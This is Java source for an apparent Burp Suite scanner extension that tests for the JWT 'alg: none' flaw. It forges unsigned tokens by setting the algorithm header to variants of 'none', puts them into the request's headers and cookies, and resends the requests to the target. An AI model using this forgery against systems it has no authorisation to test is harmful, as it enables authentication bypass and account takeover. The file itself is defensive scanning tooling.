package burp.core.scanner.active.jwtscanner;

import burp.*;
import burp.core.scanner.active.BaseScanner;
import burp.utils.BurpAnalyzedRequest;
import com.alibaba.fastjson.JSONObject;
import com.auth0.jwt.JWT;
import com.auth0.jwt.exceptions.JWTDecodeException;
import com.auth0.jwt.interfaces.DecodedJWT;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.net.MalformedURLException;
import java.util.ArrayList;
import java.util.List;

public class JWTNoneScanner extends BaseScanner implements ActionListener {

    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;
    private BurpAnalyzedRequest analyzedRequest;
    public IHttpRequestResponse httpRequestResponse;

    public JWTNoneScanner(IBurpExtenderCallbacks callbacks, IHttpRequestResponse httpRequestResponse){
        super("jwtNoneScanner");
        this.callbacks = callbacks;
        this.helpers = callbacks.getHelpers();
        this.analyzedRequest = new BurpAnalyzedRequest();
        this.httpRequestResponse = httpRequestResponse;
    }

    public List<String> getUnsignList(String jwtContent){
        DecodedJWT decodedJWT = null;
        try{
            decodedJWT = JWT.decode(jwtContent);
        }catch (JWTDecodeException Ex){
            return null;
        }

        // 解析header
        String b64jwtPayload = decodedJWT.getPayload();
        byte[] base64decodedBytes = this.helpers.base64Decode(decodedJWT.getHeader());
        JSONObject jsonObject = JSONObject.parseObject(new String(base64decodedBytes));
        // 拼接三种常用的NONE, None, none, nOne的无签名jwt形式
        List<String> checkJwtList = new ArrayList<String>();
        for (IJwtConstant.NoneFlag value : IJwtConstant.NoneFlag.values()) {
            jsonObject.replace("alg", value);
            String b64JwtHeader = this.helpers.base64Encode(new String(jsonObject.toJSONString().getBytes()).getBytes());
            checkJwtList.add(b64JwtHeader + "." + b64jwtPayload + ".");
        }

        for (String s : checkJwtList) {
            System.out.println(s);
        }

        return checkJwtList;
    }

    /*
    * 构建三个数据包，进行发包处理
    * 1、haeders头需要处理
    * 2、cookie头需要处理
    * */
    public List<IHttpRequestResponse> sendPayload(IHttpRequestResponse requestResponse, String jwt) throws MalformedURLException {
        List<IHttpRequestResponse> responseList = new ArrayList<>();
        List<String> unsignList = this.getUnsignList(jwt);

        IRequestInfo RequestInfo = this.helpers.analyzeRequest(requestResponse);
        List<IParameter> parameters = analyzedRequest.getAllParamters(requestResponse);
        List<String> headers = RequestInfo.getHeaders();
        for (String noneJwt : unsignList) {
            for (int i=0;i<headers.size();i++) {
                String s = headers.get(i).replaceFirst(IJwtConstant.regexpJwtPattern, noneJwt);
                if (!s.equals(noneJwt)){
                    headers.remove(i);
                    headers.add(s);
                    break;
                }
            }

            byte[] requestBytes = this.helpers.buildHttpMessage(headers, analyzedRequest.getRequestBody(requestResponse));

            for (IParameter parameter : parameters) {
                String parameterName = parameter.getName();
                String parameterValue = parameter.getValue();
                String s = parameterValue.replaceFirst(IJwtConstant.regexpJwtPattern, noneJwt);
                if (!s.equals(parameterValue)){
                    IParameter targetParam = this.helpers.getRequestParameter(requestResponse.getRequest(), parameterName);
                    IParameter iParameter = this.helpers.buildParameter(parameterName, s, IParameter.PARAM_COOKIE);
                    if (targetParam != null && targetParam.getType() == IParameter.PARAM_COOKIE){
                        this.helpers.updateParameter(requestBytes, iParameter);
                        requestBytes = this.helpers.updateParameter(requestBytes, iParameter);
                    }
                }
            }

            IHttpRequestResponse response = this.callbacks.makeHttpRequest(requestResponse.getHttpService(), requestBytes);
            byte[] request = response.getRequest();
            System.out.println(new String(request));
            System.out.println("==========================");
            responseList.add(response);
        }

        return responseList;
    }

    /*
    * 构建Issue
    * */
    @Override
    public IScanIssue exportIssue(IHttpRequestResponse requestResponse){
        return new BurpScanIssue(
                requestResponse.getHttpService(),
                analyzedRequest.getUrl(requestResponse),
                new IHttpRequestResponse[] { requestResponse },
                "Jwt None Sign",
                "Jwt None Sign",
                "High");
    }

    public String getScannerName() {
        return this.scannerName;
    }

    /**
     * Invoked when an action occurs.
     *
     * @param e
     */
    @Override
    public void actionPerformed(ActionEvent e) {
        System.out.println("jwtScanner click me...");


    }
}
